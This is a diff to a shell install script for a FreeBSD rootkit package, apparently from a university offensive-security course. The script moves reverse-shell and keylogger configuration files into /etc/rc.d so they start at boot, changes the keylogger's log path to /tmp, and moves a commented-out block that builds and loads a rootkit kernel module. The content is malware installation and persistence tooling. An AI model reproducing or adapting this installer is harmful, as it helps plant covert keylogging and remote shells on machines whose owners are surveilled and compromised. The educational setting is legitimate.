@@ -29,7 +29,7 @@ RSHELL="rshell_target"
 RSHELL_CONF_FILE="rshell"
 KEYLOG="keylog_target"
 KEYLOG_CONF_FILE="keylog"
-KEYLOG_LOG_FILE="/usr/home/comp6447/keylog_file"
+KEYLOG_LOG_FILE="/tmp/keylog_file"
 
 RC_INSTALL_LOCATION="/etc/rc.d/"
 RC_CONF_FILE="/etc/rc.conf"
@@ -47,21 +47,6 @@ cat << "EOF"
 
 EOF
 
-# cd $KMOD
-
-# echo ">> Clean existing build."
-# make clean
-
-# echo ">> Build rootkit."
-# make
-
-# echo ">> Install rootkit kernel module."
-
-# echo ""$NAME"_load=\"YES\"" > $LOADER_CONF
-# touch $LOADER_CONF_TRANSPARENT
-
-# mv $KMOD/$KO $INSTALL/$KO
-# kldload $INSTALL/$KO
 
 cd $BINARIES
 
@@ -105,6 +90,22 @@ mv $BINARIES/$RSHELL_CONF_FILE $RC_INSTALL_LOCATION
 
 echo ">> Move keylog configuration file into /etc/rc.d."
 mv $BINARIES/$KEYLOG_CONF_FILE $RC_INSTALL_LOCATION
+
+# cd $KMOD
+
+# echo ">> Clean existing build."
+# make clean
+
+# echo ">> Build rootkit."
+# make
+
+# echo ">> Install rootkit kernel module."
+
+# echo ""$NAME"_load=\"YES\"" > $LOADER_CONF
+# touch $LOADER_CONF_TRANSPARENT
+
+# mv $KMOD/$KO $INSTALL/$KO
+# kldload $INSTALL/$KO
 
 if [ "$2" = "DEBUG" ]
 then
